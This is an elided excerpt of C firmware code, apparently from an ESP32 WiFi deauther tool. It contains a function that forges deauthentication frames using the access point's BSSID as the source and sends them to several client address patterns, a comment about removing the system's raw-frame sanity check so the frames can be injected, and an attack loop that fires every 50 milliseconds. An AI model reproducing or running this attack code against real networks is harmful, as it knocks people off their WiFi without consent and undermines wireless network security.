...
// Removed custom ieee80211_raw_frame_sanity_check - using system version
...
void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
    ...
    // Set source and BSSID to AP's BSSID
    ...
    // Also send targeted deauth to specific clients if needed
    for(int i = 0; i < 3; i++) {
        // Change destination to different common client patterns
        uint8_t client_patterns[3][6] = {
            {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x02, 0x00, 0x00, 0x00, 0x00, 0x00}, 
            {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA}
        };
        memcpy(&deauth_frame[4], client_patterns[i], 6);
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
    }
}
...
void deautherLoop() {
    ...
    if (attack_running && isDetailView) {
        ...
        if (currentMillis - last_packet_time >= 50) {
